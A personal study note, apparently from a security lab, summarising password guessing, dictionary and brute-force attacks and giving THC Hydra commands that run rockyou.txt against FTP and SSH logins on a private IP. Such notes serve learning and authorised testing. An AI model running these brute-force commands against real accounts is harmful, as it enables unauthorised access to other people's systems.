# Password Attacks and THC Hydra Summary

## Overview
This document summarizes key concepts about **password attacks**, authentication methods, and the use of **THC Hydra** for performing dictionary-based brute-force attacks. These notes serve as a personal reference for learning and future review.

---

## Types of Password Attacks

### 1. Password Guessing
Based on personal knowledge of the target (e.g., pet’s name, birthday).

### 2. Dictionary Attack
Uses predefined wordlists of common passwords (e.g., `rockyou.txt`) to attempt authentication.

### 3. Brute Force Attack
Tries all possible character combinations — the most exhaustive and time-consuming approach.

---

## THC Hydra
**THC Hydra** is a powerful command-line tool used for automated password cracking via dictionary or brute-force attacks.

### Basic Syntax
```bash
hydra -l username -P wordlist.txt server service
```

### Examples
```bash
# FTP example
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.65.149.116 ftp

# SSH example
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.65.149.116 ssh

# Using verbose mode
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.65.149.116 ssh -vV
```